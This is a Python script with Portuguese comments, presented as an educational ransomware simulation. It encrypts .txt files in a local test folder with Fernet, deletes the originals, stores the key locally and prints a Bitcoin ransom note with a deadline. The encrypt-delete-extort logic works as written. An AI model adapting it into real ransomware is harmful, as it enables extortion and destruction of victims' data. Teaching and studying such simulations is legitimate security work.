#!/usr/bin/env python3
"""
Ransomware Simulado - Script de Criptografia
=============================================

Este script simula o comportamento de um ransomware criptografando arquivos
de texto em um diretorio de teste. Utiliza o algoritmo Fernet (AES-128-CBC)
para criptografia simetrica.

AVISO: Este script e para fins EDUCACIONAIS apenas.
Nao use em ambientes de producao ou para fins maliciosos.

Uso:
    python encrypt.py

Saidas:
    - Arquivos .enc criptografados em test_files/
    - Chave de criptografia salva em secret.key
    - Mensagem de resgate exibida no terminal
"""

import os
import sys
from pathlib import Path

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("[ERRO] Biblioteca 'cryptography' nao encontrada.")
    print("Execute: pip install cryptography")
    sys.exit(1)


def gerar_chave():
    """Gera uma chave Fernet aleatoria e salva em arquivo."""
    chave = Fernet.generate_key()
    chave_path = Path(__file__).parent / "secret.key"
    chave_path.write_bytes(chave)
    print(f"[+] Chave salva em: {chave_path}")
    return chave


def criptografar_arquivo(caminho_arquivo, chave):
    """Criptografa um arquivo individual usando Fernet."""
    fernet = Fernet(chave)

    with open(caminho_arquivo, "rb") as f:
        dados = f.read()

    dados_criptografados = fernet.encrypt(dados)

    caminho_enc = str(caminho_arquivo) + ".enc"
    with open(caminho_enc, "wb") as f:
        f.write(dados_criptografados)

    # Remove o arquivo original (simulacao de ransomware)
    os.remove(caminho_arquivo)

    return caminho_enc


def criptografar_diretorio(diretorio, chave):
    """Criptografa todos os arquivos .txt no diretorio especificado."""
    criptografados = []

    for arquivo in Path(diretorio).glob("*.txt"):
        print(f"[*] Criptografando: {arquivo.name}")
        resultado = criptografar_arquivo(arquivo, chave)
        criptografados.append(resultado)
        print(f"    -> Salvo como: {Path(resultado).name}")

    return criptografados


def exibir_mensagem_resgate():
    """Exibe mensagem de resgate no terminal (ASCII art)."""
    mensagem = """
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║            ⚠️  SEUS ARQUIVOS FORAM CRIPTOGRAFADOS  ⚠️    ║
    ║                                                          ║
    ║  Todos os seus arquivos de texto foram criptografados    ║
    ║  usando algoritmos de criptografia militares.            ║
    ║                                                          ║
    ║  Para recuperar seus arquivos, voce precisa:             ║
    ║                                                          ║
    ║  1. Enviar R$ 500,00 em Bitcoin para o endereco:        ║
    ║     1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa                   ║
    ║                                                          ║
    ║  2. Enviar comprovante para:恢复@exemplo.com              ║
    ║                                                          ║
    ║  3. Aguardar 24 horas para receber a chave               ║
    ║                                                          ║
    ║  ⏰ PRAZO: 72 horas antes da exclusao permanente ⏰       ║
    ║                                                          ║
    ║  ⚠️  NAO tente descriptografar manualmente!              ║
    ║     Isso pode causar perda permanente dos dados.         ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝

    [SIMULACAO] Este e um projeto de estudo.
    [SIMULACAO] Execute 'python decrypt.py' para restaurar seus arquivos.
    """
    print(mensagem)


def main():
    """Funcao principal do script de criptografia."""
    print("=" * 60)
    print("  RANSOMWARE SIMULADO - Script de Criptografia")
    print("  [PROJETO DE ESTUDO - NAO USAR EM PRODUCAO]")
    print("=" * 60)
    print()

    # Define o diretorio de arquivos de teste
    diretorio_teste = Path(__file__).parent / "test_files"

    if not diretorio_teste.exists():
        print(f"[ERRO] Diretorio nao encontrado: {diretorio_teste}")
        sys.exit(1)

    # Verifica se ha arquivos para criptografar
    arquivos_txt = list(diretorio_teste.glob("*.txt"))
    if not arquivos_txt:
        print("[ERRO] Nenhum arquivo .txt encontrado em test_files/")
        sys.exit(1)

    print(f"[*] Encontrados {len(arquivos_txt)} arquivos para criptografar:")
    for arq in arquivos_txt:
        print(f"    - {arq.name}")
    print()

    # Gera chave de criptografia
    print("[*] Gerando chave de criptografia...")
    chave = gerar_chave()
    print()

    # Criptografa os arquivos
    print("[*] Iniciando criptografia dos arquivos...")
    criptografados = criptografar_diretorio(diretorio_teste, chave)
    print()

    # Resumo
    print("[+] Criptografia concluida!")
    print(f"[+] {len(criptografados)} arquivos criptografados")
    print(f"[+] Chave salva em: secret.key")
    print()

    # Exibe mensagem de resgate
    exibir_mensagem_resgate()


if __name__ == "__main__":
    main()
